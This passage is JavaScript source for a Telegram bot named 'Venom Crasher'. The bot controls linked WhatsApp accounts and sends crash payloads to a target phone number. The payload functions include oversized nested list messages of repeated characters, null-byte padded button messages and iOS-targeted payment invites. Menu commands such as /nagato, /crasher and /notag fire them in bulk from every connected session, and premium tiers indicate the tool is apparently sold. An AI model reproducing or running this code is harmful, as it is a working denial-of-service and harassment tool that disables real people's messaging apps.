              url: "t.me/rainoneday",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              ctaPayload: "cta",
              disableNudge: true,
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "123132123123123@newsletter",
              serverMessageId: 1,
              newsletterName: "P",
              contentType: 3,
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function InvisiPayload(sock, jid) {
      let sections = [];

      for (let i = 0; i < 10000; i++) {
        let largeText = "ꦾ".repeat(45000);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [jid],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: jid,
                },
              },
              body: {
                text: "p                                      𐎟",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(jid, message, {
        participant: { jid: jid },
      });
    }

async function crashui(sock, jid) {
  await sock.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "p                               .",
          contentText: "p                    ." + "\u0000".repeat(70000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true
          },
          headerType: 1,
          buttons: [
            {
              body: {
                text: "p                     𐎟"
              }
            }
          ],
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "mpm",
                buttonParamsJson: "JSON.stringify(listMessage)"
              }
            ]
          }
        }
      }
    }
  }, {});
}

async function NoIos(sock, jid) {
  await sock.relayMessage(
    jid,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        serviceType: "FBPAY",
        serviceType: "yarn_info",
        serviceType: "PENDING",
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
    {
      participant: {
        jid: jid,
      },
    }
  );
}
    
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Send message with image and updated channel button
  bot.sendPhoto(chatId, "https://www.teknolalat.com/wp-content/uploads/2021/12/wallpaper-nusantara-project.jpg", {
    caption: `╭━━━━━━━━━━━━━━╮
┃    WELCOME TO BOT    
┃    Connected : ${sessions.size}
╰━━━━━━━━━━━━━━╯`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "📢 Official Channel", url: "https://t.me/lieangelllll" }],
        [
          { text: "☠️ Bug Menu", callback_data: "bug_menu" },
          { text: "👑 Owner Menu", callback_data: "owner_menu" },
        ],
      ],
    },
    parse_mode: "Markdown"
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  // Jawab callback query untuk menghindari error
  await bot.answerCallbackQuery(callbackQuery.id);

  try {
    // Hapus pesan lama
    await bot.deleteMessage(chatId, messageId);
  } catch (error) {
    console.error("Error saat menghapus pesan:", error);
  }

  // Menunggu sebentar sebelum mengirim ulang menu
  setTimeout(async () => {
    if (data === "bug_menu") {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/3d0b7e.jpeg", {
        caption: `╭━━━━━━━━━━━━━━╮
┃  𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  
┃━━━━━━━━━━━━━━
┃ Creator: @Lieangell
┃ Bot Name: 𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫
┃ Version: Beta
┃ Connected: ${sessions.size}
╰━━━━━━━━━━━━━━╯
╭───( 𝐕𝐞𝐧𝐨𝐦 - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱  )
│- /Number of deaths
│
│TQ TO :
│- GOD (helps with everything)
│- For those who have supported 𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫
│- For SC buyers
│
│𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Beta
╰────✦`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
        },
      });
    } else if (data === "owner_menu") {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/3d0b7e.jpeg", {
        caption: `╭─────────────────
    │  WELCOME TO OWNER MENU   
    │────────────────
    │ Wassup @${callbackQuery.from.username}! 
    │
    │ Command List:
    │ • /addbot [62xxx] - Add bot
    │ • /removebot [62xxx] - Remove bot
    │ • /listbot - List all bot
    │ • /addprem [id] - Add premium
    │ • /delprem [id] - Delete premium
    │ • /listprem - List premium
    │ • /addsupervip [id] - Add supervip
    │ • /delsupervip [id] - Delete supervip
    │ • /broadcast - send broadcast
    │ • /stats - Bot statistics
    ╰─────────────────`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "start_menu" }]],
        },
      });
    } else if (data === "start_menu") {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/3d0b7e.jpeg", {
        caption: `╭──(  - 𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 )
│ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @Lieangell
│ 𝙉𝙖𝙢𝙚 𝘽𝙤𝙩 : 𝐕𝐞𝐧𝐨𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫
│ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 5.0
│ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩 : ${sessions.size}
╰━━━ㅡᯓ★`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Kunjungi Channel", url: "https://t.me/Lieangell" }],
            [
              { text: "Bug Menu ☠️", callback_data: "bug_menu" },
              { text: "Owner Menuꪶ𖣂ꫂ", callback_data: "owner_menu" },
            ],
          ],
        },
      });
    }
  }, 500); // Delay 0.5 detik agar bot tidak crash saat hapus pesan
});
bot.onText(/\/get(?:@\w+)?\s+(@\w+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1].substring(1); // Hapus @ dari username
  
  try {
    // Coba dapatkan info user dari chat
    const chat = await bot.getChat(chatId);
    const members = await bot.getChatAdministrators(chatId);
    const userInfo = members.find(member => member.user.username === username);

    if (userInfo) {
      await bot.sendMessage(
        chatId,
        `╭━━━━『 USER INFO 』━━━━╮
┃ Username: @${username}
┃ User ID: ${userInfo.user.id}
┃ First Name: ${userInfo.user.first_name}
╰━━━━━━━━━━━━━━━╯`,
        { parse_mode: "Markdown" }
      );
    } else {
      await bot.sendMessage(
        chatId,
        `❌ User @${username} tidak ditemukan.\n\n💡 Pastikan:\n• Username benar\n• User ada dalam grup ini\n• User adalah admin grup ini`,
        { parse_mode: "Markdown" }
      );
    }
  } catch (error) {
    console.error("Error in get command:", error);
    
    // Berikan respons yang lebih informatif ke user
    if (error.response && error.response.statusCode === 400) {
      await bot.sendMessage(
        chatId,
        "❌ Perintah ini hanya bisa digunakan dalam grup.\n\n💡 Cara penggunaan:\n1. Tambahkan bot ke grup\n2. Jadikan bot admin\n3. Tag user dengan /get @username"
      );
    } else {
      await bot.sendMessage(
        chatId,
        "❌ Terjadi kesalahan saat mencari user.\n\n💡 Pastikan:\n• Bot adalah admin grup\n• User yang dicari ada dalam grup"
      );
    }
  }
});

// Handler untuk reply message
bot.onText(/\/get$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (msg.reply_to_message) {
    const replyUser = msg.reply_to_message.from;
    await bot.sendMessage(
      chatId,
      `╭━━━━『 USER INFO 』━━━━╮
┃ Name: ${replyUser.first_name}${replyUser.last_name ? ' ' + replyUser.last_name : ''}
┃ Username: ${replyUser.username ? '@' + replyUser.username : 'Tidak ada'}
┃ User ID: ${replyUser.id}
╰━━━━━━━━━━━━━━━╯`,
      { parse_mode: "Markdown" }
    );
  } else {
    await bot.sendMessage(
      chatId,
      `❓ *Cara Penggunaan Get ID*

1️⃣ Tag username:
/get @username

2️⃣ Reply pesan:
Reply pesan user + ketik /get

Note: Bot harus menjadi admin grup untuk mendapatkan ID user.`,
      { parse_mode: "Markdown" }
    );
  }
});
bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const commandKey = `${chatId}_${messageId}`;

  // Jika pesan sedang diproses, abaikan
  if (processingCommands.get(commandKey)) {
    return;
  }

  // Tandai pesan sedang diproses
  processingCommands.set(commandKey, true);

  try {
    // Verifikasi akses
    if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
      await bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
      return;
    }

    // Cek apakah ada bot yang terhubung
    if (sessions.size === 0) {
      await bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
      return;
    }

    // Buat pesan daftar bot
    let botList = "╭─────────────────\n│    *DAFTAR BOT*    \n│────────────────\n";
    let index = 1;

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
      botList += `│ ${index}. ${botNumber}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total: ${sessions.size} bot\n╰─────────────────`;

    // Kirim pesan daftar bot
    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  } finally {
    // Hapus status pemrosesan setelah 2 detik
    setTimeout(() => {
      processingCommands.delete(commandKey);
    }, 2000);
  }
});

const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

bot.onText(/\/nagato (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi format nomor
  const inputNumber = match[1].trim();
  const numberPattern = /^62\d{10,12}$/;  // Format: 62 diikuti 10-12 digit

  if (!numberPattern.test(inputNumber)) {
    return bot.sendMessage(
      chatId,
      `❌ *Format Nomor Tidak Valid*

✅ Format yang benar: /nagato 62895325779421
• Dimulai dengan 62 (kode negara Indonesia)
• Diikuti nomor tanpa tanda + atau spasi
• Contoh: 62895325779421

❌ Format yang salah:
• /nagato +62895325779421
• /nagato 0895325779421
• /nagato 895325779421`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = `${inputNumber}@s.whatsapp.net`;

  bot.sendPhoto(chatId, "https://www.teknolalat.com/wp-content/uploads/2021/12/wallpaper-nusantara-project.jpg", {
    caption: `╭━━━━『 BUG SENDER 』━━━━╮
┃ Target: *${inputNumber}*
┃ Status: Active & Ready
╰━━━━━━━━━━━━━━━╯

📌 *Pilih Jenis Serangan:*
🔹 Void  : Crash WhatsApp Target
🔹 Eliminate: Crash Berat + No Tag
🔹 Fuck : Khusus iPhone/iOS
🔹 CrashHard: Crash Extra Berat
🔹 Shame : Serangan Tanpa Batas
🔹 Extinct: Kombinasi Bug UI+Crash`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "👹 Void", callback_data: `crasher_${jid}` },
          { text: "📵 Eliminate", callback_data: `notag_${jid}` }
        ],
        [
          { text: "💔 Fuck", callback_data: `os_${jid}` },
          { text: "☠️ CrashHard", callback_data: `manuver_${jid}` }
        ],
        [
          { text: "♾️ Shame", callback_data: `unlimited_${jid}` },
          { text: "👾 ExtinctI", callback_data: `combox_${jid}` }
        ],
        [
          { text: "❌ Cancel", callback_data: "cancel" }
        ]
      ],
    },
  });
});

bot.onText(/\/removebot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  
  // Verifikasi owner
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya owner yang dapat menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi format nomor
  const inputNumber = match[1].trim();
  const numberPattern = /^62\d{10,12}$/;

  if (!numberPattern.test(inputNumber)) {
    return bot.sendMessage(
      chatId,
      `❌ *Format Nomor Tidak Valid*

Correct Format: /removebot 62895325779421
- Starts with 62 (Indonesia country code)
- Followed by the phone number without + or spaces
- Example: 62895325779421

Incorrect Format:
- /removebot +62895325779421
- /removebot 0895325779421
- /removebot 895325779421`,
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Cek apakah bot ada dalam sessions
    if (!sessions.has(inputNumber)) {
      return bot.sendMessage(
        chatId,
        "❌ Bot dengan nomor tersebut tidak ditemukan dalam daftar bot aktif.",
        { parse_mode: "Markdown" }
      );
    }

    // Hapus session bot
    const sock = sessions.get(inputNumber);
    if (sock) {
      // Disconnect bot jika masih terhubung
      try {
        await sock.logout();
      } catch (error) {
        console.log("Error logging out:", error);
      }
    }

    // Hapus dari sessions
    sessions.delete(inputNumber);

    // Hapus folder session
    const sessionDir = path.join(SESSIONS_DIR, `device${inputNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // Update file active_sessions.json
    try {
      let activeSessions = [];
      if (fs.existsSync(SESSIONS_FILE)) {
        activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        activeSessions = activeSessions.filter(num => num !== inputNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(activeSessions));
      }
    } catch (error) {
      console.error("Error updating sessions file:", error);
    }

    // Kirim konfirmasi
    await bot.sendMessage(
      chatId,
      `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ • Nomor: ${inputNumber}
│ • Status: Berhasil dihapus
│ • Sisa bot: ${sessions.size}
╰─────────────────`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Error removing bot:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus bot. Silakan coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*", { parse_mode: "Markdown" });
  }

  const [bugType, jid] = data.split("_");

  const bugTypes = {
    "crasher": [Bug4, InvisiPayload, InvisiPayload, Bug4],
    "notag": [Bug4, Bug3, Bug3, Bug4],
    "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
    "combox": [Bug4, Bug3, Bug3, Bug4, InvisiPayload, InvisiPayload, Bug4, Bug4],
    "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
    "unlimited": [Bug4, Bug3, Bug2, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, Bug4, Bug4],
  };

  if (!bugTypes[bugType]) {
    return;
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada bot WhatsApp yang terhubung.");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, jid);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  bot.sendMessage(
    chatId,
    `\`\`\`
╭─────────────────
│    HASIL PENGIRIMAN    
│────────────────
│ Target: ${jid}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────
\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});

bot.onText(/\/delsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar supervip."
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar Pengguna Premium:\n${premiumList || "Tidak ada pengguna premium."}`,
    { parse_mode: "Markdown" }
  );
});
bot.onText(/\/premium/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Fitur Premium*\nAnda tidak memiliki akses ke fitur ini. Silakan upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "Selamat! Anda memiliki akses ke fitur premium.");
});
const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList =
      "╭─────────────────\n│    *DAFTAR BOT*    \n│────────────────\n";
    let index = 1;

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "Terhubung" : "Tidak Terhubung";
      botList += `│ ${index}. ${botNumber}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total: ${sessions.size} bot\n╰─────────────────`;

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/crasher (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim pesan ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/notag (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Notag ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug4(sock, jid);
        await Bug2(sock, jid);
        await Bug2(sock, jid);
        await Bug4(sock, jid);
        
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
